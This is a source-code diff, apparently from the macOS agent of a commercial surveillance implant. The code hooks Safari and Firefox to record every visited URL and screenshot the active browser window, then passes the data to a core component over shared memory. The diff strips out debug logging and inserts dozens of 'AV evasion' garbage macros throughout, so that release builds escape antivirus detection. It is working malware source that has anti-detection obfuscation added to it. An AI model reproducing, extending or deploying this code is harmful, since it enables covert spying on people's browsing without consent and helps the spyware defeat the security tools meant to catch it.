@@ -19,6 +19,8 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#import "RCSMAVGarbage.h"
+
 #define BROWSER_UNKNOWN      0x00000000
 #define BROWSER_SAFARI       0x00000004
 #define BROWSER_MOZILLA      0x00000002
@@ -37,39 +39,51 @@ void logSnapshot(NSData *imageData, int browserType)
   NSString *_windowName;
   NSData *windowName;
   NSDictionary *windowInfo;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   u_int currentSnapID = gSnapID;
   gSnapID++;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
     {
-#ifdef DEBUG_URL
-      infoLog(@"No windowInfo found");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       _windowName = @"";
     }
   else
     {
       if ([[windowInfo objectForKey: @"windowName"] length] == 0)
         {
-#ifdef DEBUG_URL
-          infoLog(@"windowName is empty");
-#endif
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           _windowName = @"";
         }
       else
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+        
           _windowName = [windowInfo objectForKey: @"windowName"];
         }
     }
-
-#ifdef DEBUG_URL
-  infoLog(@"windowName: %@", _windowName);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   windowName = [[NSMutableData alloc] initWithData:
                     [_windowName dataUsingEncoding:
                     NSUTF16LittleEndianStringEncoding]];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   urlSnapAdditionalStruct *urlSnapshotAdditionalHeader = (urlSnapAdditionalStruct *)[entryData bytes];
   urlSnapshotAdditionalHeader->version        = LOG_URLSNAP_VERSION;
   urlSnapshotAdditionalHeader->browserType    = browserType;
@@ -77,42 +91,61 @@ void logSnapshot(NSData *imageData, int browserType)
     lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
   urlSnapshotAdditionalHeader->windowTitleLen = [_windowName
     lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   // URL
   [entryData appendData: [gPrevURL dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   // Window Name
   [entryData appendData: windowName];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // Now append the image
   [entryData appendData: imageData];
-
-#ifdef DEBUG_URL
-  infoLog(@"imageData size: %d", [imageData length]);
-  infoLog(@"URL: %@", gPrevURL);
-  infoLog(@"window: %@", _windowName);
-#endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   int leftBytesLength = 0;
   int byteIndex       = 0;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if ([entryData length] > MAX_COMMAND_DATA_SIZE)
-    {
-#ifdef DEBUG_URL
-      warnLog(@"Splitting image on shared memory");
-#endif
+    {      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
 
       do
         {
           NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                              ? 0x300
                              : ([entryData length] - byteIndex));
 
           shMemoryHeader->status          = SHMEM_WRITTEN;
           shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           shMemoryHeader->direction       = D_TO_CORE;
 
           //
@@ -121,16 +154,16 @@ void logSnapshot(NSData *imageData, int browserType)
           //
           if (byteIndex == 0)
             {
-#ifdef DEBUG_URL
-              infoLog(@"Sending CM_CREATE_LOG_HEADER (%d)", currentSnapID);
-#endif
+              // AV evasion: only on release build
+              AV_GARBAGE_002
+              
               shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
             }
           else if ((byteIndex + leftBytesLength) == [entryData length])
             {
-#ifdef DEBUG_URL
-              infoLog(@"Sending CM_CLOSE_LOG (%d)", currentSnapID);
-#endif
+              // AV evasion: only on release build
+              AV_GARBAGE_007
+              
               shMemoryHeader->commandType     = CM_CLOSE_LOG;
             }
           else
@@ -222,58 +255,86 @@ void logSnapshot(NSData *imageData, int browserType)
 BOOL grabSnapshot(int browserType)
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSDictionary *windowInfo;
   CGImageRef screenShot;
   NSBitmapImageRep *bitmapRep;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   //
   // Looks like it's better to wait at least a second in order to be sure
   // to get the window on the desktop in case of onProcess->Screenshot
   //
   sleep(1);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
     {
-#ifdef DEBUG_URL
-      errorLog(@"getActiveWindowInfo returned nil");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [outerPool release];
       return NO;
     }
 
   if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
     {
-#ifdef DEBUG_URL
-      errorLog(@"windowID is zero");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       return NO;
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   screenShot = CGWindowListCreateImage(CGRectNull,
                                        kCGWindowListOptionIncludingWindow,
                                        [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                        kCGWindowImageBoundsIgnoreFraming);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (screenShot == NULL)
     {
-#ifdef DEBUG_URL
-      errorLog(@"screenshot is NULL");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       return NO;
     }
   
   bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
   NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                              properties: nil];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   //
   // Log Snapshot
   //
   logSnapshot(tempData, browserType);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [bitmapRep release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   CGImageRelease(screenShot);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [outerPool release];
 
@@ -282,27 +343,31 @@ BOOL grabSnapshot(int browserType)
 
 void URLStartAgent()
 {
-  //
-  // Read configuration
-  //
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                  forAgent: AGENT_URL
                                                           withCommandType: CM_AGENT_CONF];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (readData != nil)
     {
-#ifdef DEBUG_URL
-      infoLog(@"Found configuration for Agent URL");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
       NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                               length: shMemLog->commandDataSize];
       urlStruct *urlConfiguration = (urlStruct *)[confData bytes];
       gIsSnapshotActive = urlConfiguration->isSnapshotActive;
       
-#ifdef DEBUG_URL
-      infoLog(@"snapshot active: %@", (gIsSnapshotActive == YES) ? @"YES" : @"NO");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       [confData release];
     }
   else
@@ -326,6 +391,9 @@ void URLStartAgent()
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSTimeInterval interval;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (aDict == nil)
     return;
     
@@ -334,9 +402,10 @@ void URLStartAgent()
   if (gURLDate == nil)
     {
       gURLDate = [[NSDate date] retain];
-#ifdef DEBUG_URL
-      infoLog(@"first gURLDate: %@", gURLDate);
-#endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
     }
   
   interval = [[NSDate date] timeIntervalSinceDate: gURLDate];
@@ -554,27 +623,37 @@ void URLStartAgent()
 
 - (void)webFrameLoadCommittedHook: (id)arg1
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [self webFrameLoadCommittedHook: arg1];
   
-#ifdef DEBUG_URL
-  infoLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
   NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
   
-#ifdef DEBUG_URL     
-  NSLog(@"get _url: %@", _url);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                            _agent, @"agent", nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [NSThread detachNewThreadSelector: @selector(logURL:)
                            toTarget: logObject
                          withObject: urlDict];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [logObject release];
   [_agent release];
@@ -583,18 +662,18 @@ void URLStartAgent()
 
 - (void)closeCurrentTabHook: (id)arg1
 {
-#ifdef DEBUG_URL
-  infoLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   gStopLog = 1;
   [self closeCurrentTabHook: arg1];
 }
 
 - (void)didSelectTabViewItemHook
-{
-#ifdef DEBUG_URL
-  infoLog(@"");
-#endif
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   gStopLog = 1;
   [self didSelectTabViewItemHook];
 }
@@ -605,33 +684,51 @@ void URLStartAgent()
   
   if (gStopLog == 1)
     {
-#ifdef DEBUG_URL
-      warnLog(@"They say I shouldn't log this...");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       gStopLog = 0;
       return res;
     }
 
   if (arg1 == nil || [arg1 length] == 0)
     {
-#ifdef DEBUG_URL
-      warnLog(@"Empty URL");
-#endif
-    
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       return res;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSString *_url   = [arg1 copy];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                            _agent, @"agent", nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [NSThread detachNewThreadSelector: @selector(logURL:)
                            toTarget: logObject
                          withObject: urlDict];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [logObject release];
   [_agent release];
@@ -653,11 +750,10 @@ extern char *get_url64();
 
   // Disable for 32bit browser
 #ifdef __x86_64__
-
-#ifdef DEBUG_URL
-  infoLog(@"firefox setTitle: '%@'", title);
-#endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   char *ff_url = get_url32();
 
   if(ff_url == NULL)
@@ -667,32 +763,38 @@ extern char *get_url64();
 
       if (ff_url == NULL) 
         {
-#ifdef DEBUG_URL     
-          NSLog(@"Cannot get _url");
-#endif      
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
           return;
         }
     }
-
-#ifdef DEBUG_URL
-  infoLog(@"firefox url: %s", ff_url);
-#endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_MOZILLA];
   NSString *_url = [[NSString alloc] initWithCString: ff_url encoding: NSUTF8StringEncoding];
 
   NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                            _agent, @"agent", nil];
-#ifdef DEBUG_URL     
-  NSLog(@"get urlDict: %@", urlDict);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
 
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [NSThread detachNewThreadSelector: @selector(logURL:)
                            toTarget: logObject
                          withObject: urlDict];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [logObject release];
   [_agent release];
   [_url release];
